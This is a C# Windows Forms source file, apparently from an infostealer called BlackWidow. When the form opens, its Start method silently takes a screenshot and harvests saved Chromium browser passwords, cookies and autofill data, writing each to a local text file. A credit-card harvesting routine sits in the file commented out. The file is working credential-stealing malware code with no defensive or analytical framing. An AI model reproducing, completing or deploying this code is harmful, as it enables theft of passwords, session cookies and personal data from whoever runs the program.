using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using BlackWidow.AutoFills;
using BlackWidow.Browser;
using BlackWidow.Cookie;
using BlackWidow.Other;

namespace BlackWidow
{
    public partial class bWidow : Form
    {
        public bWidow()
        {
            InitializeComponent();
            Start();
        }

        public static void Start()
        {
            GetScreenShot.TakeAndSave();
            string contents = "";
            string cookiecontent = "";
            string autofill = "";
            string creditCards = "";

            List<BrRecover> passwords = ChromiumBrowser.GetPasswords();
            foreach (BrRecover password in passwords)
            {
                contents = contents + password;
            }
            File.WriteAllText("Passwords.txt", contents);

            List<CookieChromium> cookies = ChromiumCookie.GetCookies();
            foreach (CookieChromium cook in cookies)
            {
                cookiecontent = cookiecontent + cook;
            }
            File.WriteAllText("Cookies.txt", cookiecontent);

            List<AutoFill> autoFill = AutoFillRecovery.GetAutoFill();
            foreach (AutoFill auto in autoFill)
            {
                autofill = autofill + auto;
            }
            File.WriteAllText("AutoFill.txt", autofill);

            //List<CCData> cc = CreditCards.GetCreditCard();
            //foreach (CCData auto in cc)
            //{
            //    creditCards = creditCards + auto;
            //}
            //File.WriteAllText("CreditsCard.txt", creditCards);
        }
    }
}
